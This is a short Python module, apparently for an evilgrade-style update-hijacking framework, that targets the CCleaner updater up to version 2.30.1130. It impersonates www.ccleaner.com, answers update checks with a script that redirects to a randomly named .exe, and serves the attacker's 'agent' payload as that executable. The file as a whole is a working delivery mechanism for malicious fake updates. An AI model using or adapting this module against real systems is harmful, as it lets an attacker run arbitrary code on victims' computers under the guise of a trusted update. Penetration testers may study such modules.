from modules import ModuleBase


class Ccleaner(ModuleBase):
    name = 'Ccleaner'
    appver = '<= 2.30.1130'
    version = '1.0'
    author = ['German Rodriguez < grodriguez +[AT]+ infobytesec.com >']
    description = ''
    vh = 'www.ccleaner.com' 
    requests = [
        {   'path': '/update/\?v\=',
            'type': 'string',
            'method': '',
            'bin': 0,
            'string': '<html><script>window.location="http://www.ccleaner.com/update<%RND1%>.exe"</script></html>',
            'parse': 1,
            'file': '',
        },
        {   'path': '.exe',
            'type': 'agent',
            'method': '',
            'bin': 1,
            'string': '',
            'parse': 0,
            'file': ''
        }
    ]
    options = {
        'rnd1': {
            'val': 'rand_num(5)',
            'hidden': 1,
            'dynamic': 1,
        }
    }
